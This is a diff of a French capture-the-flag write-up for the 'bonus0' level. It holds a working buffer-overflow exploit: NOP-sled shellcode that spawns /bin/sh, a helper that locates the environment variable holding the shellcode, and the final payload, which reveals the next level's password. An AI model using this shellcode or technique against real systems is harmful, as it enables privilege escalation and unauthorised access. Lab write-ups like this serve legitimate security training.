@@ -178,45 +178,32 @@ Pour outrepasser ce probleme, on peux passer le shellcode dans une variable d'en
 Pour notre exploit, on va commencer par utiliser en nombre des instructions [`NOP`](https://en.wikipedia.org/wiki/NOP_(code)) qui vont nous permettre d'atteindre l'instruction qui nous interesse.
 
 ```
-:~$ export PAYLOAD=`python -c 'print("\x90" * 4095 + "\n")'""`
+:~$ export PAYLOAD=`python -c 'print "\x90" * 64 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
 
-:~$ export PAYLOAD=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
-
-
-$ env -i payload=$(python -c 'print "\x90"*500+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb bonus0 
-
-
-"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
-
-XXXXXXXX FINIR SHELLCODE (PAYLOAD)
 ```
 
-On va créer un programme pour retrouver l'addresse de variable d'environnement pour pouvoir retrouver et utiliser notre shellcode.
-
-
-On the host:
-~$ gcc -m32 -o ./getenv ./bonus0/Ressources/getenv.c
-~$ scp -P 4242 ./getenv bonus0@192.168.122.237:/tmp
+On va créer un programme pour retrouver l'adresse de variable d'environnement pour pouvoir la retrouver et utiliser notre shellcode.
 
 ```
 :~$ cat /tmp/getenv.c
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
  
 int main(int argc, char **argv)
 {
    printf("%p\n", getenv(argv[1]));
    return(0);
 }
-:~$ gcc /tmp/getenv.c -o getenv; ./tmp/getenv PAYLOAD
-0xbffff94a
 
+:~$ cd /tmp
 
+:~/tmp$ gcc getenv.c -o getenv; ./getenv PAYLOAD
+0xbfffff6a
 
-:~$ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "PAYLOAD ADDRESS" + "\x90" * 50') > /tmp/bonus0
-:~$ cat /tmp/bonus0  - | ./bonus0
+:~/ cd ~
 
-:~$ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "PAYLOAD ADDRESS" + "\x90" * 50'; cat) | ./bonus0
+:~/ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\x6a\xff\xff\xbf" + "\x90" * 50'; cat) | ./bonus0
 
 > cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
